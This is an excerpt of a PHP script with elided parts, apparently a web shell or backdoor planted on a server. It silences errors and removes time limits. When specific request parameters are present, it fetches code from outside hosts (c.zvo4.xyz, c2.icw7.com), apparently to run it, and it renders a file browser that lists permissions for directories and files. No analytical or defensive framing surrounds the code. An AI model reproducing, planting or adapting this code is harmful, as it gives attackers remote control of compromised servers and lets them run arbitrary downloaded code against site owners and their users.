...
@set_time_limit(0);
@error_reporting(0);
$L7CRgr = "489f84326dd3b8c1819f834ed9a3cd72";
function GCNew($a)
{
...
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) {
    ...
    switch ($s) {
        case 1:
            $code = GC('https://c.zvo4.xyz/');break;
        case 2:
            $code = GC('https://c2.icw7.com/');break;
        case 3:
...
<td><center>--</center></td>
<td><center>";
        if (is_writable("$path/$dir")) echo '<font color="green">'; elseif (!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
...
<td><center>" . $size . "</center></td>
<td><center>";
        if (is_writable("$path/$file")) echo '<font color="green">'; elseif (!is_readable("$path/$file")) echo '<font color="red">';
